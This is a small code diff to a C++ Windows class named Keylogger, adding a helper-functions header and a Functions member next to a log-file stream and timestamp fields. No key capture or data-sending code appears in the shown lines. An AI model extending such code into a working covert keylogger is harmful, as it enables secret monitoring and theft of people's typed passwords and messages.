@@ -9,6 +9,7 @@
 
 #include <iostream>
 #include <windows.h>
+#include "Functions.h"
 #include <string>
 #include <codecvt>
 #include <fstream>
@@ -18,7 +19,7 @@ using namespace std;
 class Keylogger {
 
 public:
-
+    Functions *functions = new Functions();
     const locale utf8_locale = locale(locale(), new codecvt_utf8<wchar_t>());
     SYSTEMTIME st;
     wofstream file;
